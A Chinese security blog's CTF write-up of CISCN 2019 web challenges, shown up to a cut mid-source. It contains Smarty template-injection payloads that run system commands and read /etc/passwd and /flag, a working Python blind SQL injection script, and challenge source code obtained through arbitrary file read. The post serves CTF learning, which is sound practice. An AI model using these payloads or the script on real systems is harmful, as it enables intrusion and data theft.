class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E4%BA%8B/" itemprop="url">CTF赛事</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CTF%E8%B5%9B%E4%BA%8B/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF赛事</span></a></span></div></div><h1 class="post-title" itemprop="name headline">CISCN国赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-01-24T07:04:00.336Z" title="发表于 2024-01-24 15:04:00">2024-01-24</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-03T07:41:46.686Z" title="更新于 2024-03-03 15:41:46">2024-03-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">12.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>53分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="CISCN国赛"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/01/24/ctf-shua-ti-zhi-lu/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/01/24/ctf-shua-ti-zhi-lu/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/"><header><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E4%BA%8B/" itemprop="url">CTF赛事</a><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" tabindex="-1" itemprop="url">CTF赛事</a><h1 id="CrawlerTitle" itemprop="name headline">CISCN国赛</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-01-24T07:04:00.336Z" title="发表于 2024-01-24 15:04:00">2024-01-24</time><time itemprop="dateCreated datePublished" datetime="2024-03-03T07:41:46.686Z" title="更新于 2024-03-03 15:41:46">2024-03-03</time></header><h1 id="ciscn-2019华东南web11">[CISCN 2019华东南]Web11</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124152404835.png" alt="image-20240124152404835"></p>
<p>首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124153746232.png" alt="image-20240124153746232"></p>
<p>确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124153858785.png" alt="image-20240124153858785"></p>
<p>这里看了wp发现还有很多姿势，做个记录</p>
<pre><code class="hljs PHP">{<span class="hljs-variable">$smarty</span>.version}			<span class="hljs-comment">//smarty的版本号</span>

<span class="hljs-comment">#可以使用{php}{/php}标签来执行被包裹其中的php指令</span>
{php}<span class="hljs-title function_ invoke__">phpinfo</span>();{/php}
<span class="hljs-comment">#注：Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</span>

<span class="hljs-comment">#{literal}可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</span>
{literal}<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">'xss'</span>);{/literal} <span class="hljs-comment">//xss攻击 ---适用于PHP5</span>

<span class="hljs-comment">#它相比较于{php}{/php}不同的是添加了一些特性。每个{if}必须有配对的{/if}，也可以用{else}和{else if},所有的php条件表达式和函数都可以在if内使用，比如||,or,and,&amp;等</span>
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">phpinfo</span>()}{/<span class="hljs-keyword">if</span>}
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">readfile</span> (<span class="hljs-string">'/flag'</span>)}{/<span class="hljs-keyword">if</span>}
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'ls /'</span>)}{/<span class="hljs-keyword">if</span>}
{<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">'/flag'</span>)}{/<span class="hljs-keyword">if</span>}</code></pre>
<h2 id="静态方法利用">静态方法利用</h2>
<p>通过self获取Smarty类再调用其静态方法实现文件读写 ——旧版本</p>
<p>Smarty类有getStreamVariable方法可以读取一个文件并返回其内容</p>
<p><code>{self::getStreamVariable(“file:///etc/passwd”)}</code></p>
<p>利用 Smarty_Internal_Write_File 类的writeFile方法来写shell</p>
<h1 id="ciscn-2019华北day2web1">[CISCN 2019华北Day2]Web1</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124155949219.png" alt="image-20240124155949219"></p>
<p>明确告诉我们是SQL注入，接下来先fuzz一下过滤字符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124160015823.png" alt="image-20240124160015823"></p>
<p>可以看到490的都是被过滤的，很多，关键的有select，–+，//*，/**/，information，length，and等，有意思的是这题似乎还有组合过滤的情况</p>
<p>并且页面只会回显，false与true对应的页面，也就是说只能sql盲注。</p>
<p>根据题目提示的flag位于flag表、flag列下，那估计就是二分法爆破flag字符了，接下来肯定就是想如何构造合适的payload来运行py脚本。</p>
<p>这里也是陷入误区，看了wp才明白忘记判断闭合方式了，这里我们可以先尝试数学运算</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124161453566.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124161508716.png" alt="image-20240124161508716"></p>
<p>可以看到异或运算的结果不同，说明为数字型注入，那我们借着异或方式来构造payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">'http://node4.anna.nssctf.cn:28470/index.php'</span>
flag = <span class="hljs-string">""</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (left + right) // <span class="hljs-number">2</span>
    <span class="hljs-keyword">while</span> left &lt; right:
        payload = <span class="hljs-string">f"0^(ascii(substr((select(flag)from(flag)),<span class="hljs-subst">{i}</span>,1))&gt;<span class="hljs-subst">{mid}</span>)"</span>
        data= {<span class="hljs-string">"id"</span>:payload}
        <span class="hljs-comment">#start_time = time.time()</span>
        response = requests.post(url = url, data = data).text
        <span class="hljs-comment">#end_time = time.time()</span>
        <span class="hljs-comment">#use_time = end_time - start_time</span>

        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hello"</span> <span class="hljs-keyword">in</span> response:
            left = mid + <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid = (left + right) // <span class="hljs-number">2</span>

    <span class="hljs-comment">#print(mid)</span>
    flag += <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"flag:"</span>, flag)</code></pre>
<p>由于页面有数据回显，因此这里没必要用if来判断</p>
<h1 id="ciscn-2019华北day1web1">[CISCN 2019华北Day1]Web1</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124164241331.png" alt="image-20240124164241331"></p>
<p>进入首页发现是一个登录页面，扫网站无果后，尝试注册用户，接着看到有一个上传文件的功能，不过限制了上传马，那我们正常上传指定文件类型，发现出现下载和删除两个功能。那很容易想到这两个功能肯定存在漏洞，根据漏洞利用来看，我们先找下载功能的漏洞。点击抓包如图所示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172310599.png" alt="image-20240124172310599"></p>
<p>可以看到能实现任意文件的读取</p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    <span class="hljs-keyword">die</span>();
}
<span class="hljs-meta">?&gt;</span>


&lt;!DOCTYPE html&gt;
&lt;html&gt;

&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
&lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;
&lt;title&gt;网盘管理&lt;/title&gt;

&lt;head&gt;
    &lt;link href=<span class="hljs-string">"static/css/bootstrap.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span>&gt;
    &lt;link href=<span class="hljs-string">"static/css/panel.css"</span> rel=<span class="hljs-string">"stylesheet"</span>&gt;
    &lt;script src=<span class="hljs-string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;
    &lt;script src=<span class="hljs-string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;
    &lt;script src=<span class="hljs-string">"static/js/toast.js"</span>&gt;&lt;/script&gt;
    &lt;script src=<span class="hljs-string">"static/js/panel.js"</span>&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;nav aria-label=<span class="hljs-string">"breadcrumb"</span>&gt;
    &lt;ol <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">breadcrumb</span>"&gt;</span>
<span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>"&gt;管理面板&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>"&gt;&lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>="<span class="hljs-title">fileInput</span>" <span class="hljs-title">class</span>="<span class="hljs-title">fileLabel</span>"&gt;上传文件&lt;/<span class="hljs-title">label</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>="<span class="hljs-title">active</span> <span class="hljs-title">ml</span>-<span class="hljs-title">auto</span>"&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="#"&gt;你好 &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SESSION</span>['<span class="hljs-title">username</span>']?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span>
<span class="hljs-class">    &lt;/<span class="hljs-title">ol</span>&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">nav</span>&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>="<span class="hljs-title">file</span>" <span class="hljs-title">id</span>="<span class="hljs-title">fileInput</span>" <span class="hljs-title">class</span>="<span class="hljs-title">hidden</span>"&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">top</span>" <span class="hljs-title">id</span>="<span class="hljs-title">toast</span>-<span class="hljs-title">container</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class"></span>
<span class="hljs-class">&lt;?<span class="hljs-title">php</span></span>
<span class="hljs-class"><span class="hljs-title">include</span> "<span class="hljs-title">class</span>.<span class="hljs-title">php</span>";</span>
<span class="hljs-class"></span>
<span class="hljs-class">$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">FileList</span>($<span class="hljs-title">_SESSION</span>['<span class="hljs-title">sandbox</span>']);</span>
<span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Name</span>();</span>
<span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Size</span>();</span>
<span class="hljs-class">?&gt;</span></code></pre>
<p>class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">"127.0.0.1"</span>;
<span class="hljs-variable">$dbuser</span> = <span class="hljs-string">"root"</span>;
<span class="hljs-variable">$dbpass</span> = <span class="hljs-string">"root"</span>;
<span class="hljs-variable">$dbname</span> = <span class="hljs-string">"dropbox"</span>;
<span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;
        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>{
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">"s"</span>, <span class="hljs-variable">$username</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();
        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">"SiAchGHmFx"</span>);
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">"ss"</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">"SiAchGHmFx"</span>);
        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">"s"</span>, <span class="hljs-variable">$username</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
